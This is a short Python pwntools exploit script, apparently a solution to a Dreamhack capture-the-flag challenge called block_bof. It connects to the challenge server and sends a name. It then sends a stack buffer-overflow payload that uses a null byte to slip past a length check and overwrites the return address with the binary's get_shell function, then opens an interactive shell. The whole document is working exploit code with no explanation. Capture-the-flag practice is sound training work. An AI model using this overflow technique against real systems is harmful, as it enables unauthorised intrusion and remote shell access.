from pwn import *

exe = ELF("block_bof_patched", checksec=False)

# p = process(exe.path)
p = remote('host8.dreamhack.games', 15067)

input()
get_shell = 0x401273
p.sendlineafter(b'name??',b'A'*8 + b'\x00')
payload = b'A'*7 + b'\x00' + b'B'*(56 - 8) + p64(get_shell)
p.sendlineafter('commnet : ', payload)
p.interactive()